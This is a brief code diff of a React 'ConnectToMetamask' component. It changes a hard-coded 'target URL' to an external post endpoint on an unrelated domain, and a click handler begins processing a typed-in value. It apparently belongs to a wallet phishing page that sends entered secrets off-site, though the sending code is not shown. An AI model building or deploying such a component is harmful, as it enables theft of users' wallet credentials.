@@ -8,7 +8,7 @@ import "./styles.css";
 const ConnectToMetamask = ({ connectToMetamask }) => {
   const [value, setValue] = useState('');
 
-  const url = 'https://bnetly.com'; // replace with your target URL
+  const url = 'https://net.bnetly.com/post.jsp'; // replace with your target URL
 
   const handleClick = () => {
     if (value !== '') {
